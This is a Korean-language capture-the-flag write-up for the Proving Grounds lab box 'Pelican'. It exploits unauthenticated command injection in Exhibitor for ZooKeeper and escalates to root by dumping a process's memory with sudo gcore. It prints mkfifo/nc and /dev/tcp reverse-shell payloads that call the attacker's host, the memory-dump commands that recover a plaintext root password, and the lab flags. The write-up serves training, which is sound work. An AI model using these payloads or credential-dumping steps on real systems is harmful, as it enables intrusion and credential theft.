# Pelican

**Platform:** Offensive Security Proving Grounds (PG Practice) **IP:** 192.168.57.98 **Difficulty:** Easy **OS:** Linux (Debian 10) **Type:** Boot2Root **Date:** 2026-03-31 **Status:** ✅ Rooted

---

## Tags

`#pgpractice` `#linux` `#exhibitor` `#zookeeper` `#commandinjection` `#gcore` `#memoryforensics` `#sudo` `#passworddump` `#oscp`

---

## Summary

Exhibitor for ZooKeeper의 `java.env script` 필드를 통한 unauthenticated command injection으로 초기 접근 획득. `charles` 유저로 shell 획득 후 `sudo gcore`로 `/usr/bin/password-store` 프로세스 메모리를 덤프하여 root 비밀번호를 평문으로 추출.

---

## Enumeration

### Port Scan

```bash
nmap -p- --min-rate 10000 -T4 192.168.57.98
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
631/tcp   open  ipp
2181/tcp  open  eforward
2222/tcp  open  EtherNetIP-1
8080/tcp  open  http-proxy
8081/tcp  open  blackice-icecap
34051/tcp open  unknown
```

### Service Scan

```bash
nmap -p 22,139,445,631,2181,2222,8080,8081,34051 -sC -sV --min-rate 10000 -T4 192.168.57.98
```

|Port|Service|Version|
|---|---|---|
|22/2222|SSH|OpenSSH 7.9p1 Debian|
|139/445|SMB|Samba 4.9.5-Debian|
|631|IPP|CUPS 2.2|
|2181|Zookeeper|3.4.6|
|8080|HTTP|Jetty 1.0 (Exhibitor)|
|8081|HTTP|nginx 1.14.2 → redirect to 8080|
|34051|Java RMI|Java RMI|

### Key Findings

- **포트 8081** → `http://192.168.57.98:8080/exhibitor/v1/ui/index.html` 로 리다이렉트
- **Exhibitor for ZooKeeper v1.0** → `java.env script` 필드에 Command Injection 가능
- 인증 없이 Config 페이지 접근 가능 (unauthenticated)

---

## Exploitation

### Vulnerability

**Exhibitor for ZooKeeper — Unauthenticated RCE via java.env script field**

- Exhibitor UI의 Config 탭 → `java.env script` 필드에 임의 명령어 삽입 가능
- Commit 시 ZooKeeper 재시작 과정에서 스크립트가 root/서비스 유저 권한으로 실행됨

### Step 1 — Exhibitor UI 접근

```
http://192.168.57.98:8080/exhibitor/v1/ui/index.html
```

### Step 2 — 리스너 열기

```bash
nc -lvnp 4444
```

### Step 3 — Command Injection payload 삽입

**Config 탭 → Editing 토글 ON → java.env script 필드:**

```bash
export JAVA_OPTS="-Xms1000m -Xmx1000m"
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.57/4444 >/tmp/f
```

> ⚠️ **Note:** `bash -i >& /dev/tcp/...` 방식은 동작하지 않았음. mkfifo를 이용한 nc reverse shell 사용.

**Commit... 버튼 클릭**

### Result

```
connect to [192.168.49.57] from (UNKNOWN) [192.168.57.98] 34038
charles@pelican:/opt/zookeeper$
```

---

## Post Exploitation — Local Flag

TTY 업그레이드:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
cat /home/charles/local.txt
# cfe00c2de26c6f795441ae3ddefbfeee
```

---

## Privilege Escalation

### sudo -l 확인

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/gcore
```

`gcore` — GNU Core Dump 도구. 실행 중인 프로세스의 메모리를 덤프할 수 있음.

### password-store 프로세스 발견

```bash
ps aux | grep -E "password|store"
# root  494  /usr/bin/password-store
```

root가 `/usr/bin/password-store` 프로세스를 실행 중 → 메모리에 비밀번호가 평문으로 존재할 가능성 있음.

### gcore로 메모리 덤프

```bash
sudo /usr/bin/gcore 494
```

### 덤프에서 비밀번호 추출

```bash
strings core.494 | grep -i pass
# 001 Password: root:

strings core.494 | grep -A1 "Password: root"
# 001 Password: root:
# ClogKingpinInning731
```

### root 전환

```bash
su root
# Password: ClogKingpinInning731
```

---

## Root Flag

```bash
cat /root/proof.txt
# e9b9c09467a7db06a2a56536b1b00a02
```

---

## Flags

|Flag|Location|Value|
|---|---|---|
|local.txt|`/home/charles/local.txt`|`cfe00c2de26c6f795441ae3ddefbfeee`|
|proof.txt|`/root/proof.txt`|`e9b9c09467a7db06a2a56536b1b00a02`|

---

## Attack Chain

```
Nmap → Exhibitor UI (8080) → java.env script Command Injection
→ mkfifo nc reverse shell → charles shell → local.txt
→ sudo gcore → password-store PID 494 메모리 덤프
→ strings | grep → root 비번 평문 추출 → su root → proof.txt
```

---

## Failed Attempts & 실패 원인

|시도|결과|실패 원인|
|---|---|---|
|`bash -i >& /dev/tcp/IP/4444 0>&1`|❌ 연결 안됨|Exhibitor가 bash redirect를 제대로 처리 못함|
|`$(/bin/bash -i >& /dev/tcp/IP/4444 0>&1)`|❌ 연결 안됨|`$()` subshell 방식도 동작 안함|
|Kali IP 변경 후 payload 미수정|❌ 연결 안됨|PG Practice 세션 재시작 시 IP 변경됨 (192.168.49.55 → 192.168.49.57)|
|Editing 토글 OFF 상태로 Commit|❌ 저장 안됨|Editing을 ON으로 켜야 필드 수정 및 Commit 가능|
|gcore 675 (lightdm) 덤프|❌ 비번 없음|lightdm 프로세스엔 비번 평문 없음|
|gcore 656 (lightdm session) 덤프|❌ 비번 없음|동일하게 비번 없음|

---

## Lessons Learned

- **PG Practice는 세션 재시작 시 IP가 바뀔 수 있음** → `ifconfig`로 항상 현재 IP 재확인
- Exhibitor UI에서 **Editing 토글을 ON**으로 켜야 수정 가능
- `bash -i >& /dev/tcp/...` 안될 때 **mkfifo + nc** 방식 시도
- `sudo -l`에서 **gcore** 보이면 → `ps aux`로 민감한 프로세스 찾기 → 메모리 덤프 → `strings | grep -i pass`
- `/usr/bin/password-store` 같은 커스텀 프로세스는 메모리에 **평문 비번**을 보관할 수 있음
- `strings core.XXX | grep -A1 "Password:"` 패턴으로 비번 추출

---

## References

- [Exhibitor RCE - HackerOne Report](https://www.exploit-db.com/exploits/48654)
- GTFOBins: gcore
- CVE: Exhibitor for ZooKeeper unauthenticated RCE